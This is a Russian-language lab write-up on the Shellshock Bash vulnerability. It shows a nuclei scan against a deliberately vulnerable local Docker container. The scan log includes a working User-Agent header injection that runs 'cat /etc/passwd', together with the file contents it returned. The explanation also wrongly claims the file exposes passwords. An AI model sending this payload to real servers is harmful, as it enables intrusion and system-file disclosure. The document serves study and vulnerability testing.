#### Уязвимость Shellshock

---

Уязвимость в программе Bash (командная оболочка), которая позволяет выполнить вредоносную команду на сервере, если сервер использует Bash для обработки некоторых веб-запросов. Например, если на сервере есть специальные скрипты (CGI), которые написаны на Bash, то через специальный заголовок можно заставить сервер выполнить любую команду

--- 

#### Шаги реализации

1. Запуск докер-контейнера с уязвимой тестовой средой

```bash
docker run -d -p 8080:80 --name shellshock vulnerables/cve-2014-6271
```

2. Создание шаблона ```nuclei:``` ```shellshock_nuclei.yaml.```

3. Запуск
```bash
# src/Task1/shellshock_nuclei.yaml
nuclei -u http://localhost:8080 -t shellshock_nuclei.yaml --debug # можно --debug для большей информативности
```

4. Получаем ответ:
```bash
                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.7.1

                projectdiscovery.io

[WRN] Found 1 templates loaded with deprecated protocol syntax, update before v3 for continued support.
[INF] Current nuclei version: v3.7.1 (outdated)
[INF] Current nuclei-templates version: v10.4.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 121
[INF] Templates loaded for current scan: 1
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] [shellshock-vulnerability-nuclei] Dumped HTTP request for http://localhost:8080/cgi-bin/vulnerable

GET /cgi-bin/vulnerable HTTP/1.1
Host: localhost:8080
User-Agent: () { :; }; echo; /bin/bash -c 'cat /etc/passwd'
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip

[DBG] [shellshock-vulnerability-nuclei] Dumped HTTP response http://localhost:8080/cgi-bin/vulnerable

HTTP/1.1 200 OK
Connection: close
Transfer-Encoding: chunked
Date: Thu, 23 Apr 2026 10:04:44 GMT
Server: Apache/2.2.22 (Debian)

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
[shellshock-vulnerability-nuclei:status-1] [http] [critical] http://localhost:8080/cgi-bin/vulnerable
[shellshock-vulnerability-nuclei:dsl-2] [http] [critical] http://localhost:8080/cgi-bin/vulnerable
[INF] Scan completed in 77.29925ms. 2 matches found.
```

---

#### Что произошло?

Уязвимость Shellshock в Bash на сервере. 

1. Веб-сервер обрабатывает CGI-скрипты, передавая им HTTP-заголовки как переменные окружения.
2. Заголовое User-Agent преобразуется в переменную окружения ```HTTP_USER_AGENT.```
3. В уязвимых версиях Bash, если значение переменной начинается с ```() {```, Bash интерпретирует его как определение функции. Ошибка заключалась в том, что после определения функции Bash также выполнял любые команды, следующие после ```}``` в том же значении переменной окружения.
4. Следовательно, Bash выполнил часть с ```echo; /bin/bash -c 'cat /etc/passwd'``` из переменной окружения. Это позволило получить список пользователей и паролей в системе и сопоставить match.
